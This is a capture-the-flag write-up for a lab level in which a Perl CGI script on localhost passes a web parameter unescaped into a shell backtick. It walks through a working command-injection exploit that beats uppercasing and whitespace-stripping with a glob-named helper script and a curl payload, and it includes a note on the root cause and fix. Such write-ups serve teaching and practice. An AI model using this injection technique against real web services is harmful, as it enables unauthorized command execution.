# Level 12

## 1. Target Information
- **User:** `level12`
- **Password:** `***FLAG11***`
- **Target:** `flag12`
- **SSH Port:** `4242`

---

## 2. Reconnaissance & Discovery
Look at the home directory:

```bash
ls -la
cat level12.pl
```

**Findings:**
- A single Perl CGI script `level12.pl` owned by `flag12`. There is no token file — the secret is reached through a running web service.
- The script is served over HTTP on `localhost:4646` and reads two parameters, `x` and `y`:

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;          # (1) input is UPPERCASED
  $xx =~ s/\s.*//;             # (2) truncated at first whitespace
  @output = `egrep "^$xx" /tmp/xd 2>&1`;   # (3) injected into a shell backtick, inside "..."
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) { print(".."); }
  else           { print("."); }
}

n(t(param("x"), param("y")));
```

### Confirm who runs the service
```bash
ps aux | grep -i perl
# flag12 ... perl .../level12.pl   (served on 127.0.0.1:4646)
curl 'http://localhost:4646/?x=a&y=b'
# .   (the one-bit oracle: "." or "..")
```
**Key observations:**
- The web service runs as **flag12**, so any command it executes runs with flag12's privileges.
- The `.`/`..` output is just a one-bit oracle; the real sink is the backtick that embeds `$xx` (our `x` parameter) directly into a shell command with no escaping.

---

## 3. Vulnerability Analysis
- **Flaw Type:** Shell command injection via unsanitized input interpolated into a Perl backtick (`` `...` ``).
- **Technical Explanation:**
  - `` @output = `egrep "^$xx" /tmp/xd 2>&1` `` interpolates attacker input `$xx` directly into a command string handed to `/bin/sh`. Shell substitution (`` `...` ``, `$(...)`) in `$xx` breaks out and runs arbitrary commands.
  - Those commands run as **flag12** (the service owner), so we can invoke `getflag` with flag12's identity even though we connect as `level12`.
  - The two "sanitization" steps are the real puzzle, not real defenses. We must craft a payload that survives both:
    1. **`tr/a-z/A-Z/`** — everything we inject is uppercased. Linux paths/commands are case-sensitive, so we cannot type `` `getflag` `` (it becomes `GETFLAG`, which does not exist).
    2. **`s/\s.*//`** — everything from the first whitespace onward is deleted, so the payload must contain **no spaces, tabs, or newlines**.
  - We also land **inside double quotes** (`"^$xx"`), so `;`, `|`, `&&` are literal and do *not* separate commands — only `` `...` `` / `$(...)` execute inside the quotes.
  - The script never sends the command's stdout back to us (only the `.`/`..` oracle), and worse, that stdout is spliced back into the `egrep` pattern. So the injected command must **exfiltrate** its result to a file we can read, and must do so *internally* so nothing leaks back into the egrep pattern.
  - **Root cause / fix:** never build a shell command by interpolating untrusted input. Pass arguments to a program without an intervening shell (e.g. list-form `system`/`open`), or strictly validate input. Uppercasing and whitespace-trimming are not security controls.

---

## 4. Exploitation Walkthrough

### Beating the three constraints
- **Uppercase:** put the real work in a script file whose name is already uppercase (contents are read from disk, never passed through `tr`, so lowercase `getflag` inside is fine).
- **`tmp` path is lowercase:** reference the script with a glob so the lowercase `tmp` directory is matched by `*`: `/*/EXPLOIT` uppercases to itself and expands to `/tmp/EXPLOIT`.
- **Inside double quotes / no spaces:** invoke it with a backtick and no whitespace: `` `/*/EXPLOIT` ``.

### Step 1: Create the uppercase helper script (as level12)
```bash
cat > /tmp/EXPLOIT <<'EOF'
#!/bin/sh
getflag > /tmp/gf 2>&1
EOF
chmod +x /tmp/EXPLOIT
```

### Step 2: Trigger the injection through the CGI
```bash
curl 'http://localhost:4646/?x=`/*/EXPLOIT`&y=.'
```

Server-side, after uppercasing and substitution, the backtick becomes:

```bash
egrep "^`/*/EXPLOIT`" /tmp/xd 2>&1
#         └─ glob expands to /tmp/EXPLOIT, which runs as flag12:
#            getflag > /tmp/gf
```
- The `x` parameter has **no spaces** (survives `s/\s.*//`).
- `` ` ``, `/`, `*` have no case (survive `tr/a-z/A-Z/`).
- The backtick executes even inside the double quotes.
- Output is redirected to `/tmp/gf` *inside the script*, so nothing contaminates the egrep pattern.

### Step 3: Read the exfiltrated token
```bash
cat /tmp/gf
# Check flag.Here is your token: ***FLAG12***
```
The injection already ran `getflag` as flag12, so `***FLAG12***` is the
**level13 password** directly — no `su flag12` is needed.

---

## 5. Flag
```text
Check flag.Here is your token: ***FLAG12***
```
- **Next Level User:** `level13`
- **Password for next level:** `***FLAG12***`
